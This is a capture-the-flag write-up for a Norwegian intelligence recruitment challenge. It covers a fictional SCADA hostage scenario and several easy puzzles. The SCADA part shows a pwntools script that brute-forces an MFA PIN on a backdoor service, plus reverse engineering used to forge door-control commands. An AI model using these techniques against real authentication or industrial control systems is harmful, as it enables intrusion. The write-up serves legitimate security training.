## [2.3_scada](./2_oppdrag/2_scada)

### [2.3_onion](./2_oppdrag/2_scada/onion)

_This task was possible to solve beforehand by doing a simple nmap scan on the same network that `corax` was on._ 

With the help of the extracted `Important links` file from the Vault in the Android application, we find the following URL.

```
Hidden service URL:
http://fileserver/files/onion_name.txt
```

Downloading this we are presented with a [Tor (anonymity network)](https://www.torproject.org) URI: `tpcoe34czvwcm2uqsthc4xviy6hkngzexo2qhstwhh42itwplbqmm6id.onion`. Opening it in the Tor browser gives us the `scada_frontend`.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/3_scada/onion/screenshots/6232a528e67e4d2aa3102f540dfa4096.png" width="500">

Checking the Javascript console in the browser, we see the following log, containing our flag. In addition it tells use that we can use the host `scada` instead of the onion host for a stable connection.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/3_scada/onion/screenshots/5d8f1ba6d119409295ebf6413a9a7889.png" width="500">

---

```sh
login@corax:~$ scoreboard b4ba373b44abfb94763e54297d3d19d8
Kategori: 2. Oppdrag
Oppgave:  2.3_onion
Svar:     b4ba373b44abfb94763e54297d3d19d8

Du har fått tilgang til gisseltakerenes bakdør inn i styringssystemet. Klarer du å styre systemet selv?
```


### [2.3_scada_aksess](./2_oppdrag/2_scada/aksess)

The previous flag gave us a hint regarding a _backdoor_ (bakdør).

```
Du har fått tilgang til gisseltakerenes bakdør inn i styringssystemet.
Klarer du å styre systemet selv?
```

And from the chat log `07 DES 2020`, we see that they talk about a backdoor and usernames.

```
[18:27] B4tCracK: for future reference; your username to the backdoor is the first three letters of your first name followed by the
[18:27] B4tCracK: length of your username here and ending with your last name. The capital letters of your name stays capital.
[18:27] B4tCracK: I will NOT repeat this, and do NOT, I repeat; DO NOT write it down!
```
---

#### Usernames
We have all the information we need to find the usernames for each person and generate the following list.

| Username           | Full name      | Backdoor username |
| ------------------ | -------------- | ----------------- |
| hungry_hippo_123   | Frank Shorius  | Fra16Shorius      |
| eireen89           | Eireen Farnaby | Eir8Farnaby       |
| RADAR              | Joe Farnaby    | Joe5Farnaby       |
| B4tCracK           | Dillian Cruise | Dil8Cruise        |

----

#### Enumeration

We now need to find the actual backdoor. We already know there is a web application (`scada_frontend`) running on the `scada` host, and decide to scan it with nmap:

```sh
Nmap scan report for 074767c25656ad47d4c9d6b079a1ff25_scada.1.w7z18rmflsmd7aj2hb5iez19u.074767c25656ad47d4c9d6b079a1ff25_backend (10.0.74.75)
Host is up (0.0038s latency).
Scanned at 2020-12-21 11:48:24 CET for 1615s
Not shown: 65532 closed ports
PORT     STATE SERVICE        VERSION
80/tcp   open  http           nginx 1.14.2
|_http-title: scada_frontend
1338/tcp open  wmc-log-svc?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     Username: That username is not recognized
|     were unable to log you in..
|   NULL: 
|_    Username:
1339/tcp open  kjtsiteserver?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Sec-Websocket-Version: 13
|     X-Content-Type-Options: nosniff
|     Date: Mon, 21 Dec 2020 10:59:29 GMT
|     Content-Length: 12
|     Request
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Sec-Websocket-Version: 13
|     X-Content-Type-Options: nosniff
|     Date: Mon, 21 Dec 2020 10:59:04 GMT
|     Content-Length: 12
|_    Request
```

We see two additional ports, `1338` and `1339`, and see that port `1338` requests a username.

---

#### Backdoor
Manually connecting to port `1338` promps for a username, and if we input something random we see that the username is not recognized. However, if we input one of the usernames from our list, we see that Frank's user has been revoked answer. We therefore assume that this port is the backdoor that we need to use.

```sh
login@corax:~$ nc scada 1338
Username: test
That username is not recognized
We were unable to log you in..
```
```sh
login@corax:~$ nc scada 1338
Username: Fra16Shorius
User access revoked..
We were unable to log you in..
```

--- 

#### Multi-factor authentication

Connecting to the backdor using one of the other usernames we are prompted for a PIN that has been sent to the users' phone via. SMS.
```sh
login@corax:~$ nc scada 1338
Username: Joe5Farnaby
We have now sent a login PIN to you via SMS
Enter PIN: 111
..the provided PIN was not correct.
```
Attempting to add more than 3 digits result with the same error message appended multiple times, depending on how many extra digits we add, indicating that the connection is held open. 
```sh
login@corax:~$ nc scada 1338
Username: Joe5Farnaby
We have now sent a login PIN to you via SMS
Enter PIN: 1111
..the provided PIN was not correct.
..the provided PIN was not correct.
```
```sh
login@corax:~$ nc scada 1338
Username: Joe5Farnaby
We have now sent a login PIN to you via SMS
Enter PIN: 11111
..the provided PIN was not correct.
..the provided PIN was not correct.
..the provided PIN was not correct.
```
---

#### Bruteforce
We write a quick and dirty [Python script](./2_oppdrag/3_scada/aksess/access_backdoor.py) that runs a loop that tries to login with the username `Joe5Farnaby`. It is possible to bruteforce this PIN as the connection after the first attempt is still open, and continue allowing the client to send data. Running this script gives us a welcome back message and the flag is included.

```python
from pwn import *
while True:
    io = remote("scada", 1338)
    io.recvuntil(':')
    io.send("Joe5Farnaby")
    io.recvuntil(':')
    try:
        for i in range(999):
            pin = str(i).zfill(3)
            io.sendline(pin)
            data = io.recv()
            if b"Welcome back" in data:
                # PIN worked, we are in!
                io.recvline()
                io.recvline()
                io.recvline()
                io.recvline()
                exit(0)
            elif b"too many digits" in data:
                # You have entered too many digits for the MFA check
                # Reset connection
                break
            # else: the provided PIN was not correct
        except Exception as e:
            print("Exception in client:", e)
    io.close()
```

---

```sh
login@corax:~$ scoreboard 6b7e34a771b84d0863ce3c7dbd887463
Kategori: 2. Oppdrag
Oppgave:  2.3_scada_aksess
Svar:     6b7e34a771b84d0863ce3c7dbd887463

Godt jobbet! Nå må du bare hjelpe gisselet med å komme seg ut av bygningen!
```




### [2.3_scada_gissel](./2_oppdrag/2_scada/gissel)

With the help of the extracted `Important links` file from the Vault in the Android application, we find a URL to a `Scada client binary` and proceed with downloading it.
```
Scada client binary:
http://fileserver/files/082391170510954df0c28af1ebb9380a
```
---

#### Scada client binary
Taking a closer look at the binary we see that it attempts to send instructions to a server.

```sh
login@corax:~$ file 082391170510954df0c28af1ebb9380a
082391170510954df0c28af1ebb9380a: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=394244046241254d7f237474592c3c135d078290, not stripped
```

```sh
$ ./082391170510954df0c28af1ebb9380a scada 1339
Sending instruction number 000
Sending instruction number 001
Sending instruction number 002
Sending instruction number 003
Sending instruction number 004
Sending instruction number 005
```

---

##### Network packets

We proceed with starting Wireshark and forward the port to our local machine and attempt to execute the binary again. We notice a packet with the data `020431313132` being sent every time the binary prints a `Sending instruction number`, the data never changes. Transforming this data `02 04 31 31 31 32` gives us the following `? ? 1 1 1 2`.

![f288b72a5f014423a1457dba0b5ddad5.png](./2_oppdrag/3_scada/gissel/screenshots/f288b72a5f014423a1457dba0b5ddad5.png)

---

##### Reversing

Opening the binary in Ghidra we see that the logic in the `main` function calls a `make_instruction` function with the parameter `2`, `11`, and `12`, and then sends it to the specified host. 

We notice that the first parameter, `2`, matches the first value in our packet data `02`, and in addition, the ASCII hex code for the number `1` is `31`, and `2` for `32`. Giving us ``2 ? 11 12`` as our data, matching the arguments sent to `make_instruction(2,11,12...`. We also assume that the 2nd value in the packet data is the length of the following data `len(1112) = 4`, thus we have `2 4 11 12`.

The `local_c` variable is simply a loop increment counter, which is the number printed when running the binary. We also take a mental note of the `sleep(5)`, as this will be important for later.

```c
 while( true ) {
    local_10 = connect_to_server(param_2[1],param_2[2],param_2[2]);
    local_14 = make_instruction(2,11,12,&local_20,&local_28);
    // --- snip ---
    printf("Sending instruction number %03d\n",(ulong)local_c);
    sVar1 = write(local_10,local_20,local_28);
    // --- snip ---
    sleep(5);
    local_c = local_c + 1;
  }

```

Furthermore, we double check what we found below by looking in the `make_instruction` function. And confirm that the binary generates an identical instruction that is sent for each loop increment. This is why we never saw the packet data change in the network traffic. 
```c
make_instruction(undefined param_1,byte param_2,byte param_3,void **param_4,long *param_5)
  local_1d = 0;
  local_19 = 0;
  iVar1 = snprintf((char *)&local_1d,5,"%02d%02d",(ulong)param_2,(ulong)param_3);
  if (iVar1 == 4) {
  // --- snip ---
```

Knowing now that the client library sends some kind of instructions to the backdoor, we need to figure out what these instructions mean.

---

#### Scada frontend
Going back to the frontend and, we notice that the red box moves around, and some of the "walls" are changing colors.
<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/3_scada/gissel/screenshots/a0111cef11e04d948f7de4e79961e864.gif" width="500">

Taking a closer look at the network tab of the browser developer tools we see WebSocket communication between the frontend and a server running on port `1339`. Notice also that the data in these packet contain of some ID (`0005`) and the word `locked`.
<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/3_scada/gissel/screenshots/bc0325ae4d264c00851b63c689917fa3.png" width="700">

---

##### Files
We continue by quickly downloading the web application files with `wget -r scada`, and notice that the web application is in fact a [Vue.js](https://vuejs.org/) application and **the [source maps](https://developer.mozilla.org/en-US/docs/Tools/Debugger/How_to/Use_a_source_map) are available**. Put shortly, source maps are there mainly for developers, but it also allows visitors to view the "source code" of your web application, instead of having to deobfuscate/unminify it first.

You can find an example where I used the same technique for PST's (Norwegian Police Security Service) NPST 2020 competition [here](https://github.com/mklarz/npst2020-src).

After downloading everything, we have the following files (they can be found [here](./2_oppdrag/3_scada/gissel/scada_frontend/packed)):


```sh
├── css
│   └── app.62e869b4.css
├── favicon.ico
├── index.html
├── js
│   ├── app.0459ce51.js
│   ├── app.0459ce51.js.map
│   ├── chunk-vendors.c7adce26.js
│   └── chunk-vendors.c7adce26.js.map
└── map
    ├── cell.png
	--- snip ---
```

##### Unpacking the source code
As we are only interested in the web application, we ignore the chunk-vendors, and continue with unpacking.

```sh
$ unpack ./unpacked app.0459ce51.js.map
--- snip ---
🎉  All done! Enjoy exploring your code 💻
```

And are yet again presented with new files (they can be found [here](./2_oppdrag/3_scada/gissel/scada_frontend/unpacked)), and continue to dig deeper.

```sh
├── src
│   ├── App.vue
│   ├── App.vue?3f7e
│   ├── App.vue?dfb6
│   ├── components
│   │   ├── Map.vue
│   │   ├── Map.vue?00e3
│   │   ├── Map.vue?e750
│   │   ├── Scada.vue
│   │   ├── Scada.vue?2f42
│   │   ├── Scada.vue?3e35
│   │   ├── Tile.vue
│   │   ├── Tile.vue?25f1
│   │   └── Tile.vue?f0b9
│   └── main.js
└── webpack
    └── bootstrap

3 directories, 14 files
```

---

##### Scada frontend source code

Looking at `src/components/Scada.vue` we find the following HTML, which passes the current data into a `Map` component, and then prints the flag if it is set. We can also see how the web application connects with to the WebSocket we found earlier. If the WebSocket data packet includes the word `flag`, the data is parsed and the variable is set, thus printing out the flag.  

```html
<template>
	<div class="scada">
		<Map v-if="this.json_data !== ''" v-bind:data='JSON.parse(this.json_data)'/>
		<h1 v-else>Currently no SCADA data</h1>
	</div>
	<footer class="flag" v-if="this.flag !== ''">
	  <pre>Prisoner managed to escape. Flag: "{{ flag }}"</pre>
	</footer>
</template>
```

```js
// snip
let sock = self.ws ? self.ws : new WebSocket(`ws://${location.hostname}:1339/`);
let magic_message = "POm8HLEmXJ1L2b1EhaXvdg==";
sock.onopen = function() {
	self.ws = sock;
	//console.log("[open] Conn established");
	//console.log(`Sending to server ${magic_message}`);
	sock.send(magic_message);
};
sock.onmessage = function(e) {
	//console.log(`[message] Data from server ${e.data}`);
	if (e.data.includes("flag")) {
		self.flag = JSON.parse(e.data)["flag"]
	}
	self.json_data = e.data;
};
// snip
},
```

Continuing with our treasure hunt, we look at the data passed to the `Map` (`src/components/Map.vue`) component, and see that the component uses [the data](./2_oppdrag/3_scada/gissel/scada_frontend/websocket.json), which we found earlier in the WebSocket connection. We look for the number we found in the binary, `1112`, and see that it's here as well. As the value of these keys are either `locked` or `unlocked`, we assume that they are doors in map.

```html
--- snip ---
<Tile v-bind:state='"sensor-"+data["motion-sensor-13"]'/>
<Tile v-bind:state='"ver-"+data["0005"]'/>
<Tile v-bind:state='"hor-"+data["1112"]'/>
--- snip ---
```

Knowing this, we try to execute our binary once again, and notice one of the doors (door ID `1112`, see map below) changing colors from red to green.

Having the source code of the frontend it was very feasible to generate a map with each door ID mapped.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/3_scada/gissel/screenshots/73b4f3df7c2a45b5bde670cd6bf0199b.png" width="500">

Looking at the animated picture of the map from earlier, we can see that the doors change their states from red, to green, to yellow, and finially back to red. Each of the 4 corners in the map have doors opening and closing, all except of the top right corner, where the hostage is located within a cell. We therefore assume that the terrorists patrol each their own corner.

----

#### Custom Scada client
After some quick testing, we map the possible door states to their own ID.
| ID | State    | 
| -- | -------- |
| 00 | Locked   |
| 01 | Unlocked |
| 02 | Open     |

Going back to the network packet for the original Scada Client Library, we recall the data being in the format `020431313132` or `241112`, and we now have a complete overview of how to open and close each door

| State ID | Length | Door ID  |
| -------- | ------ | -------- |
| 02       | 04     | 31313132 |
| 2        | 4      | 1112     |

Continuing with our progress, we decide to create our [own version](./2_oppdrag/3_scada/gissel/scada_client.py) of the Scada Client. Ideally it should use the data from the websocket to decide which door to open and close, but doing it manually works fine.

---

#### Rescue operation

We can finially start our rescue operation and only need to find a path that we want to use, and be careful to not step into the view of either the motion detector, or the patrols.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/3_scada/gissel/screenshots/5d3bf4df9c45481e8702bb811f09feba.png" width="500">

Starting the client and recalling from earlier, that the instruction had a sleep time of 5 seconds (`sleep(5)`), we wait for each door to close (about 5 seconds), before continuing to the next door. This is assuming that the hostage needs time to move between the doors.

```
$ python scada_client.py scada 1338
--- snip ---
>>>>>>>>>>>>>>>> OPEN DOORS <<<<<<<<<<<<<<<<
(press 'q' to go back to the menu)
Door ID: 0005
[*] Done!
--- snip ---
>>>>>>>>>>>>>>>> OPEN DOORS <<<<<<<<<<<<<<<<
(press 'q' to go back to the menu)
Door ID: 3499
[*] Done!
```

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/2_oppdrag/3_scada/gissel/screenshots/5ca9d47be3fa4285b5c129f25011a9e7.png" width="500">

---

```
login@corax:~$ scoreboard edf5691e9a719cf5d7c23954ef90f94e
Kategori: 2. Oppdrag
Oppgave:  2.3_scada_gissel
Svar:     edf5691e9a719cf5d7c23954ef90f94e

Gratulerer! Du klarte å frigi gisselet, og har løst årets oppdrag!
I en jobb i Etterretningstjenesten vil du få mulighet til å bidra til å løse
et viktig samfunnsoppdrag med ekte situasjoner og "skarpe" oppdrag.

Vi har laget denne CTF-en for å tiltrekke oss søkere til vårt talentprogram
i 2021.

Talentprogram cyberoperasjoner er et unikt kursopplegg som tilbys kandidater
med riktig motivasjon, kompetanse og personlige egenskaper.
Ved å løse dette oppdraget har du bevist at du har motivasjon og
kompetanse som vi trenger. Du trenger ikke kunne alt fra før - gjennom
talentprogrammet blir du skikkelig god. Vi oppfordrer deg til å søke!

Talentprogrammet er bare én av mange veier inn i tjenesten. Vi har behov
for medarbeidere med et bredt spekter av bakgrunn og kompetanse. Vil du vite
mer om hvilke muligheter som finnes for en karriere i Etterretningstjenesten,
så kan du sende en e-post til karriere@etj.no. Vi håper å høre fra deg!
```



# [3. Utfordringer](./3_utfordringer)

## [3.1. Utfordringer lett](./3_utfordringer/1_lett)



### [3.1.1_clmystery](./3_utfordringer/1_lett/clmystery)
clmystery is a open-source "A command-line murder mystery". This was basically identical to last years challenge, we can therefore use the same technique. Copy the files from `corax` to our local machine, and clone the `clmystery` source. Finially compare the directories and find the differences. 

```sh
$ scp -r cybertalent:~/3_utfordringer/1_lett/clmystery/mystery mystery2
$ git clone https://github.com/veltman/clmystery myster2
$ diff --no-dereference mystery/vehicles mystery2/vehicles
31830c31830
< Owner: Jeremy Bowers
---
> Owner: Victor Sidney
```

```sh
login@corax:~$ scoreboard Victor Sidney
Kategori: 3.1. Utfordringer lett
Oppgave:  3.1.1_clmystery
Svar:     Victor Sidney

Gratulerer, korrekt svar!
```



### [3.1.2_fibonacci](./3_utfordringer/1_lett/fibonacci)

> # Fibonacci
>
>Klarer du å regne ut fibonacci raskt nok?
>
>
>Adresse: tcp://fibonacci:7600

Connecting to the server we are provided with randomly generated data (`fib(176)`), asking for the answer of `fib(176)`.

```sh
login@corax:~$ nc fibonacci 7600
fib(176)
pwn
Sorry, that was wrong
```

Calculating fib(x) can potentially be very slow, I therefore decided to download a static list ([`fib.txt`](./fib.txt)) of fibonacci numbers and use that to "calculate" the fibonacci numbers.
```sh
$ head -n 5 fib.txt
0 	0
1 	1
2 	1
3 	2
4 	3
```

##### [`solve.py`](./1_lett/fibonacci/solve.py)
```python
import re
from pwn import *

fib = {}
with open("fib.txt") as f:
    for line in f.read().splitlines():
        s = line.split("\t")
        fib[s[0].strip()] = s[1].strip()

io = remote("fibonacci", 7600)

print("Starting...")
while True:
    s = io.readlineS()
    r = re.search(r"fib\((.*?)\)", s)
    if not r:
        print(s)
        print(io.readlineS())
        print(io.readlineS())
        print(io.readlineS())
        io.close()
        exit(0)
    n = r.group(1).strip()
    f = fib[n]
    io.sendline(f)
```

```sh
$ python3 solve.py
Starting...
╭──────╮
│ FLAG ╰───────────────────────────╮
│ ce954ec88c3bef5ecf088239541c6b3f │
╰──────────────────────────────────╯
```

```sh
login@corax:~/scripts/fib$ scoreboard ce954ec88c3bef5ecf088239541c6b3f
Kategori: 3.1. Utfordringer lett
Oppgave:  3.1.2_fibonacci
Svar:     ce954ec88c3bef5ecf088239541c6b3f

Gratulerer, korrekt svar!
```



### [3.1.3_math](./3_utfordringer/1_lett/math)

#### [3.1.3_math_1](./3_utfordringer/1_lett/math/#313_math_1)

```
# Matematikk
 
Jeg har laget en matematikk-tjeneste.
Vil du prøve å logge inn på systemet?

Adresse: http://math:7070

PS: Det er 2(TO) flagg i denne oppgaven
```

Simple challenge, curl the provided URL, find a link to the flag.
`login@corax:~$ curl math:7070`
```html
<p><a href="/flag_1">Flag 1</a></p><p><a href="/flag_2">Flag 2</a></p>
```
`login@corax:~$ curl math:7070/flag_1`
```html
 ──────╮
│ FLAG ╰───────────────────────────╮
│ 1f3191fabf49137b4a1c8e41d2cb3730 │
╰──────────────────────────────────╯
```

```sh
login@corax:~$ scoreboard 1f3191fabf49137b4a1c8e41d2cb3730
Kategori: 3.1. Utfordringer lett
Oppgave:  3.1.3_math_1
Svar:     1f3191fabf49137b4a1c8e41d2cb3730

Gratulerer, korrekt svar!
```

#### [3.1.3_math_2](./3_utfordringer/1_lett/math/#313_math_2)

Continuing with flag #2 we find that it requires a specific user agent set.

`login@corax:~$ curl math:7070/flag_2`

> wrong user agent - must be Math Calculator (Python 3)

After setting the `User-Agent` header, we have a cookie set and are redirected to another location (`/challenge`).
```shell
login@corax:~$ curl math:7070/flag_2 -H "User-Agent: Math Calculator (Python 3)" -v

< Location: http://math:7070/challenge
--- snip ---
< Set-Cookie: user_id="!ACLXo5IfaJKH1CaFqyrYiw==?gASVIAAAAAAAAACMB3VzZXJfaWSUjBAyZDA3ZGQ5MTFiNDdhZDlmlIaULg=="
```

Executing the new request with a cookie set we are provided with a math equation, that we can easily solve with a dirty python script that `eval`s the equation (**_never do this_**). It is also important that we keep the same session as we have to solve multiple equations. After letting the script run for a few seconds, we are provided with the flag #2.
```shell
login@corax:~$ curl math:7070/challenge -H "User-Agent: Math Calculator (Python 3)" -H 'user_id="!ACLXo5IfaJKH1CaFqyrYiw==?gASVIAAAAAAAAACMB3VzZXJfaWSUjBAyZDA3ZGQ5MTFiNDdhZDlmlIaULg=='
33555-807979
```

##### [`solve.py`](./3_utfordringer/1_lett/math/solve.py)
```python
import requests

URL = "http://math:7070/challenge"
HEADERS = {"User-agent": "Math Calculator (Python 3)"}
s = requests.Session()

r = s.get(URL, headers=HEADERS)
next_equation = r.content.decode()
while True:
    print("eq =", next_equation)
    answer = str(eval(next_equation))
    print("answer =", answer)
    r = s.post(URL, answer, headers=HEADERS)
    next_equation = r.content.decode()
```

```sh
$ python solve.py
╭──────╮
│ FLAG ╰───────────────────────────╮
│ 12ea10a72a5c3828a1f3141bd9e5030b │
╰──────────────────────────────────╯
```

```sh
login@corax:~/scripts/1_3_math$ scoreboard 12ea10a72a5c3828a1f3141bd9e5030b
Kategori: 3.1. Utfordringer lett
Oppgave:  3.1.3_math_2
Svar:     12ea10a72a5c3828a1f3141bd9e5030b

Gratulerer, korrekt svar!
```



### [3.1.4_rusty_reversing_easy](./3_utfordringer/1_lett/rust_lett)

```
# Rust-tilbakevikling - lett

Jeg er litt Rust(en) når det kommer til mine evner innen tilbakevikling. Kan du hjelpe meg?

   Fil: rust_easy
```

We are provided with a binary, and notice that it has be compiled with `debug_info` (debug symbols).
```sh
$ file rust_easy
rust_easy: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=802d5f1d534235f77ae80115570e6efc5260f107, with debug_info, not stripped
```
Opening the binary with [Ghidra](https://ghidra-sre.org/) and searching for the string after `flag` we find the following strings:

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/rust_lett/screenshots/b211a6b1a5c647848b5ceeef31187c7c.png" width="200">

We decompile the function where the string is used (`main`) and take note of the `Storage` class.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/rust_lett/screenshots/47b0f0f0c16a473680a1609914a65b5d.png" width="200">

```c
Storage::new
Storage::check_password
Storage::get_flag
```

Checking the `Storage::new` method we find the start of the password: `this_super_secret_password_`

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/rust_lett/screenshots/b071ac6e58ed43b485955f1929179dcb.png" width="200">

Continuing in the same function we see the following variables and put them togheter into one hex string: `32292e342d251e2f2e351e23241e263424323220232d24`
```c
  *puVar1 = 0x32;
  puVar1[1] = 0x29;
  puVar1[2] = 0x2e;
  puVar1[3] = 0x34;
  puVar1[4] = 0x2d;
  puVar1[5] = 0x25;
  puVar1[6] = 0x1e;
  puVar1[7] = 0x2f;
  puVar1[8] = 0x2e;
  puVar1[9] = 0x35;
  puVar1[10] = 0x1e;
  puVar1[0xb] = 0x23;
  puVar1[0xc] = 0x24;
  puVar1[0xd] = 0x1e;
  puVar1[0xe] = 0x26;
  puVar1[0xf] = 0x34;
  puVar1[0x10] = 0x24;
  puVar1[0x11] = 0x32;
  puVar1[0x12] = 0x32;
  puVar1[0x13] = 0x20;
  puVar1[0x14] = 0x23;
  puVar1[0x15] = 0x2d;
  puVar1[0x16] = 0x24;
```

By [XORing](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'41'%7D,'Standard',false)&input=MzIyOTJlMzQyZDI1MWUyZjJlMzUxZTIzMjQxZTI2MzQyNDMyMzIyMDIzMmQyNA) the data with `0x41` (`A`) we get the following string: `should_not_be_guessable`. Adding the two strings togheter we get our password and input it into the binary we finally get the flag.

```sh
login@corax:~/3_utfordringer/1_lett/rust_lett$ ./rust_easy
Enter password: this_super_secret_password_should_not_be_guessable
Flag: etj{rusty_binaries_are_not_thaaat_difficult_right}
```

```sh
login@corax:~/3_utfordringer/1_lett/rust_lett$ scoreboard etj{rusty_binaries_are_not_thaaat_difficult_right}
Kategori: 3.1. Utfordringer lett
Oppgave:  3.1.4_rusty_reversing_easy
Svar:     rusty_binaries_are_not_thaaat_difficult_right

Gratulerer, korrekt svar!
```


### [3.1.8_punchcard](./3_utfordringer/1_lett/punchcard)

**Note:** I solved this challenge after the CTF.

From the Norwegian Armed Force's page about the [Cybertalent Program](https://www.forsvaret.no/jobb/talentprogram-cyberoperasjoner) we find the following image, and notice the dots on the horse, which look like old [punch cards](https://en.wikipedia.org/wiki/Punched_card).

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/punchcard/screenshots/aa8ba51c503042c48257d4944ec668c6.jpg" width="200">

---

#### Highlighting
After performing some image manipulation as an attempt to highlight the boxes even more, we notice very similar boxes to the left of the horse.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/punchcard/screenshots/0d0635a3f3c84b739bd8c1e1753b3f3a.png" width="200">


<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/punchcard/screenshots/8059be00ce994061a3591b59280878b1.png" width="200">

---

#### Pattern
There seemed to be a repeating pattern, and when drawing columns and rows we see that there are 12 rows, and repeating pattern every 11 column.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/punchcard/screenshots/2c25ea0e7af34f8c8ed560f06feba606.png" width="200">

---

#### Big
Attempting to do the same to the boxes on the horse, we see that the same pattern exists there, albeit the last rows are offset a bit.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/punchcard/screenshots/d09997bbf7de419a821c012168acd412.png" width="200">

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/punchcard/screenshots/d77edc61b2c2434c91d02077d4555db1.png" width="200">

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/punchcard/screenshots/78d904ffcc7c46feb99a87fc1b1e7890.png" width="200">

---

#### Grid
Further processing gives us the following grid.

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/punchcard/screenshots/02690c59e3a04ad19386517575d35b09.png" width="100">

<img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/punchcard/screenshots/02690c59e3a04ad19386517575d35b09.png" width="100">

|   	    | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 10 | 11	|
|--------|---|---|---|---|---|---|---|---|---|----|----|
| **12** | X |   | X | X | X | X |   |   | X | X  | X 	|
| **11** |   | X	|   |   | X |   | X | X | X |    | X 	|
| **0**  |   | X	| X | X |   |   |   | X |   | X  |   	|
| **1**  |   |  	|   |   |   |   |   |   |   |    |   	|
| **2**  |   |  	|   |   |   |   |   |   |   |    |   	|
| **3**  |   |  	|   |   |   |   |   |   |   |    |   	|
| **4**  |   | X	|   |   |   |   | X | X |   |    |   	|
| **5**  |   |  	|   |   | X |   |   |   | X |    | X  |
| **6**  |   |  	|   |   |   |   |   |   |   |    |   	|
| **7**  |   |  	| X |   |   |   |   |   |   |    |   	|
| **8** 	| X |  	|   |   |   |   |   |   |   |    |   	|
| **9** 	|   |  	|   | X |   |   |   |   |   | X  |   	|

#### IBM-EBCDIC

We find that this pattern matches the IBM-EBCDIC punch cards.

> Before ASCII became the standard, many of the internal codes used to represent characters within computers were strongly influenced by the punched card code for characters. One of the most famous of such codes, and one that has persisted in use the longest, is, of course, EBCDIC (Extended Binary-Coded Decimal Interchange Code). The diagram below illustrates the relationship between EBCDIC and punched card code:
>
> <img src="https://raw.githubusercontent.com/mklarz/ctf-writeups/main/2020/etterretningstjenesten/cybertalent-winter/3_utfordringer/1_lett/punchcard/screenshots/diagram.gif" width="200">
> 
> [Source](http://quadibloc.com/comp/cardint.htm)

Now map the columns and rows to 0s and 1s, depending on where it's punched (X).

|   	    | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 10 | 11	|
|--------|---|---|---|---|---|---|---|---|---|----|----|
| **12** | 1 | 0 | 1 | 1 | 1 | 1 | 0 | 0 | 1 | 1  | 1 	|
| **11** | 0 | 1	| 0 | 0 | 1 | 0 | 1 | 1 | 1 | 0  | 1 	|
| **0**  | 0 | 1	| 1 | 1 | 0 | 0 | 0 | 1 | 0 | 1  | 0 	|
| **1**  | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0  | 0 	|
| **2**  | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0  | 0 	|
| **3**  | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0  | 0 	|
| **4**  | 0 | 0	| 0 | 0 | 0 | 0 | 1 | 1 | 0 | 0  | 0 	|
| **5**  | 0 | 0 | 0 | 0 | 1 | 0 | 0 | 0 | 1 | 0  | 1  |
| **6**  | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0  | 0 	|
